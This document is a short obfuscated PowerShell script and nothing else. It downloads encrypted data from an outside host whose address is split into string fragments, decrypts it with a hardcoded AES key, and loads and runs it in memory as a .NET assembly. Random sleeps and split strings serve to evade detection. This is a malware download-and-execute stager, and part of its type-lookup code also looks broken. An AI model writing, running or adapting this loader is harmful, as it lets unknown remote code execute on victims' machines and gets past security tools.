&{
$z1='U3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5BZXM=';[byte[]]$k1=0x2B,0x7E,0x15,0x16,0x28,0xAE,0xD2,0xA6,0xAB,0xF7,0x15,0x88,0x09,0xCF,0x4F,0x3C;[byte[]]$k2=0x76,0x2E,0x71,0x60,0xF3,0x8B,0x4D,0xA1,0x6C,0x94,0x0A,0x25,0x8F,0x4A,0x89,0xC7;$k=[byte[]]($k1+$k2);
[byte[]]$v=0..15;$w=New-Object ('Net.'+'Web'+'Client');Start-Sleep -m (Get-Random -Min 100 -Max 300);
try{$e=$w.('Down'+'load'+'Data')('https://'+'main'+'45.b'+'-cdn.'+'net'+'/TS'+'ha')}catch{exit};
$a=[Type]::GetTypeFromHandle([Runtime.InteropServices.GCHandle]::Alloc([System.Convert]::FromBase64String($z1).ToString('utf-8'))).InvokeMember('Create', 'NonPublic, Static, InvokeMethod', $null, $null, $null);$a.Key=$k;$a.IV=$v;$a.Mode='C'+'B'+'C';
$d=$a.('Create'+'Decryptor')();$m=New-Object ('IO.Mem'+'ory'+'Stream');$c=New-Object ('Security.Cryptog'+'raphy.Crypto'+'Stream')($m,$d,'W'+'rite');
$c.Write($e,0,$e.Length);$c.Close();$b=$m.ToArray();Start-Sleep -m (Get-Random -Min 50 -Max 150);
[Reflection.Assembly]::('Lo'+'ad')($b).('Entry'+'Point').Invoke($null,@())
}
